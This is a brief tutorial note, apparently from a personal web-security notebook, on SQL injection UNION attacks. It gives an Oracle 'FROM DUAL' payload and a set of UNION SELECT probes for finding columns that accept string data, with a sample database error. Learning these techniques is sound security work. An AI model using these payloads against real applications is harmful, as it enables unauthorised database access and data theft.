---
description: >-
  On Oracle, every SELECT query must use the FROM keyword and specify a valid
  table. There is a built-in table on Oracle called dual which can be used for
  this purpose. So the injected queries on Oracle
---

# Database-specific syntax

<mark style="color:$warning;">`' UNION SELECT NULL FROM DUAL--`</mark>

[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

```applescript
##
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--


```

If the column data type is not compatible with string data, the injected query will cause a database error, such as:

<pre class="language-angular-ts"><code class="lang-angular-ts"><strong>Conversion failed when converting the varchar value 'a' to data type int.
</strong></code></pre>

If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.
